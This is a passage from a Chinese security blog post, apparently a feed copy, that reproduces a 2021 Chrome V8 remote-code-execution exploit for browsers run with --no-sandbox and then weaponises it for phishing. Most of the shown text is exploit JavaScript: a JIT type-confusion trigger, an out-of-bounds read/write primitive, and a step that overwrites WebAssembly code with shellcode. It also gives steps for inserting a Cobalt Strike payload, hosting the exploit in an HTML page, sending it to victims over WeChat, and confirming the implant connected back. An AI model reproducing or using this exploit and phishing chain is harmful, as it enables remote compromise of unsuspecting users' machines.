class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oob = oobAccess();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span><br><span class="line">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target_function(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    print(<span class="string">"start running"</span>);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样cs生成payload</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419212952589.png" alt="image-20210419212952589"></p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419213058336.png" alt="image-20210419213058336"></p><p>exp中替换shellcode，保存为wx.js</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214858501.png" alt="image-20210419214858501"></p><p>创建html文件引用wx.js，<code>&lt;script src=&quot;wx.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419213533804.png" alt="image-20210419213533804"></p><p>进行微信钓鱼</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214721415.png" alt="image-20210419214721415"></p><p>上线成功</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214738282.png" alt="image-20210419214738282"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要复现近期Chrome 0day RCE及利用其进行钓鱼，本文仅供参考学习。&lt;/p&gt;&lt;h3 id=&quot;Chrome&quot;&gt;&lt;a href=&quot;#Chrome&quot; class=&quot;headerlink&quot; title=&quot;Chrome&quot;&gt;&lt;/a&gt;Chrome&lt;/h3&gt;&lt;p&gt;影响版本：&lt;/p&gt;&lt;p&gt;Google Chrome &amp;lt; = 89.0.4389.114和使用Chrome内核的其他浏览器。&lt;/p&gt;&lt;p&gt;利用条件：&lt;/p&gt;&lt;p&gt;关闭沙箱模式 –no-sandbox&lt;/p&gt;&lt;h3 id=&quot;Chrome漏洞复现及钓鱼&quot;&gt;&lt;a href=&quot;#Chrome漏洞复现及钓鱼&quot; class=&quot;headerlink&quot; title=&quot;Chrome漏洞复现及钓鱼&quot;&gt;&lt;/a&gt;Chrome漏洞复现及钓鱼&lt;/h3&gt;&lt;p&gt;exp:&lt;/p&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;gc&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;0x80000&lt;/span&gt;; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;ArrayBuffer&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; shellcode = [shellcode];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; wasmCode = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;115&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;127&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;131&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;129&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;110&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;138&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; wasmModule = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; WebAssembly.Module(wasmCode);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; wasmInstance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; WebAssembly.Instance(wasmModule);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; main = wasmInstance.exports.main;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; bf = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; bfView = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;DataView&lt;/span&gt;(bf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;fLow&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;f&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setFloat64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, f, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (bfView.getUint32(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;fHi&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;f&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setFloat64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, f, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (bfView.getUint32(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;i2f&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;low, hi&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setUint32(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, low, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setUint32(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, hi, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; bfView.getFloat64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;f2big&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;f&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setFloat64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, f, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; bfView.getBigUint64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;big2f&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;b&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       bfView.setBigUint64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, b, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; bfView.getFloat64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;LeakArrayBuffer&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ArrayBuffer&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;constructor&lt;/span&gt;(size) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;super&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.slot = &lt;span class=&quot;number&quot;&gt;0xb33f&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;foo&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;a&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (a) x = &lt;span class=&quot;number&quot;&gt;0xFFFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; arr = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.sign(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; - &lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.max(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, x, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       arr.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; local_arr = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       local_arr[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] = &lt;span class=&quot;number&quot;&gt;5.1&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//4014666666666666&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; buff = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LeakArrayBuffer(&lt;span class=&quot;number&quot;&gt;0x1000&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//byteLength idx=8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       arr[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] = &lt;span class=&quot;number&quot;&gt;0x1122&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; [arr, local_arr, buff];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       foo(&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   gc(); gc();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [corrput_arr, rwarr, corrupt_buff] = foo(&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   corrput_arr[&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;] = &lt;span class=&quot;number&quot;&gt;0x22444&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;delete&lt;/span&gt; corrput_arr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span 